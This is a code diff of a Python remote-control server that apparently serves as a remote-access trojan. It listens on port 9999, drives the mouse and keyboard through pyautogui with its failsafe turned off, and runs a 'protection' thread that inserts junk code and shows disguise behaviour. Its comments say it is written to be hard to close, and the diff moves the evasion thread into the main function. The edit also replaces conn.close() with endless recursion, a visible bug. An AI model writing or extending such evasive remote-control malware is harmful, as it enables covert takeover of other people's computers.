@@ -10,16 +10,6 @@ import time
 import subprocess
 from protector import *
 
-# ============= 初始化保护 =============
-def run_protection():
-    init_protection()
-    junk_code()          # 插入垃圾代码
-    fake_behavior()      # 显示伪装行为
-    time.sleep(random.randint(5, 15))  # 延迟执行
-
-# 创建守护线程运行保护逻辑
-Thread(target=run_protection, daemon=True).start()
-
 # 配置信息
 HOST = '0.0.0.0'
 TCP_PORT = 9999
@@ -410,15 +400,27 @@ def handle_connection(conn, addr):
 
     except Exception as e:
         print(f"处理连接异常: {str(e)}")
+        with open("crash.log", "a") as f:
+            f.write(f"{time.ctime()} 崩溃原因:\n{traceback.format_exc()}\n")
         # 直接强行重新打开，程序往死里写不能轻易关掉！！！！
         handle_connection(conn, addr)
     finally:
-        conn.close()
+        handle_connection(conn, addr)
 
 
 def target_main():
     # 启动UDP监听线程
     Thread(target=udp_broadcast_listener, daemon=True).start()
+
+    # ============= 初始化保护 =============
+    def run_protection():
+        init_protection()
+        junk_code()          # 插入垃圾代码
+        fake_behavior()      # 显示伪装行为
+        pass
+
+    # 创建守护线程运行保护逻辑
+    Thread(target=run_protection, daemon=True).start()
 
     # TCP主服务
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -431,6 +433,11 @@ def target_main():
 
 
 if __name__ == "__main__":
-    pyautogui.FAILSAFE = False
-    print("[OK] 启动控制端")
-    target_main()
+    try:
+        pyautogui.FAILSAFE = False
+        print("[OK] 启动控制端")
+        target_main()
+    except Exception as e:
+        with open("crash.log", "a") as f:
+            f.write(f"{time.ctime()} 崩溃原因:\n{traceback.format_exc()}\n")
+        os.system("pause") # 保持窗口查看错误
